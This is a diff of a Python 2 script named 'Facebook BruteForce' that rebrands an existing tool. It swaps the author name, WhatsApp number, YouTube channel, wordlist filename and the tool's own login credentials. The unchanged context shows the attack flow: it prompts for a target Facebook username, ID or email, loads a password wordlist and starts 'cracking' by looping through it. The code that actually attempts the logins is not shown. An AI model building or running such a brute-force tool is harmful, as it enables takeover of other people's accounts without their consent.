@@ -4,9 +4,9 @@
         
         #############################################
         #                                           #
-        #    Facebook BruteForce, by Kashi Gangster        #
-        #    Youtube:    Gangster Teaches and Technical zone   #
-        #   Whtsapp Num +923062045786                                  #
+        #    Facebook BruteForce, by Rk Nahid        #
+        #    Youtube:    99 GAMER   #
+        #   Whtsapp Num +8801892752688                                  #
         #############################################
 
 
@@ -30,7 +30,7 @@ def jalan(z):
 time.sleep(0.5)
 user = raw_input('[💀] Target Username/ID/Email >>?? ')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[💀] Wordlist Type kashi.txt >> ')
+wrdlstFileName = raw_input('\n[💀] Wordlist Type nahid.txt >> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
@@ -41,7 +41,7 @@ time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
-#Dev:kashi_gangster
+#Dev:99_GAMER
 ##### LOGO #####
 logo = """
        \033[1;97m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
@@ -50,16 +50,16 @@ logo = """
     \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
    \033[1;96m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
   \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
-  \033[1;91m:》》》\033[1;93m+923062045786\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-KashiGangster-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..............................KashiGangster......................
+  \033[1;91m:》》》\033[1;93m+8801892752688\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-RkNahid-\033[1;95m♡╭──────────•◈•──────────╮♡
+\033[1;92m..............................RkNahid......................
 \033[1;97m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
 \033[1;97m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Arain Brand
 \033[1;97m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;93m♡╰──────────•◈•──────────╯♡\033[1;96mKashiGangster\033[1;95m♡╰──────────•◈•──────────╯♡"""
-print " \x1b[1;93m=Whtsapp Num +923062045786="
-CorrectUsername = "Pak Power"
-CorrectPassword = "kashigangster"
+\033[1;93m♡╰──────────•◈•──────────╯♡\033[1;96mRkNahid\033[1;95m♡╰──────────•◈•──────────╯♡"""
+print " \x1b[1;93m=Whtsapp Num +8801892752688="
+CorrectUsername = "Rk"
+CorrectPassword = "Rk"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -70,10 +70,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+            os.system('xdg-open https://www.youtube.com/channel/UCil2tcF-xVmaQL2IV2MmQxg')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+        os.system('xdg-open https://www.youtube.com/channel/UCil2tcF-xVmaQL2IV2MmQxg')
 def login():
 	os.system('clear')
 for password in wordlist:
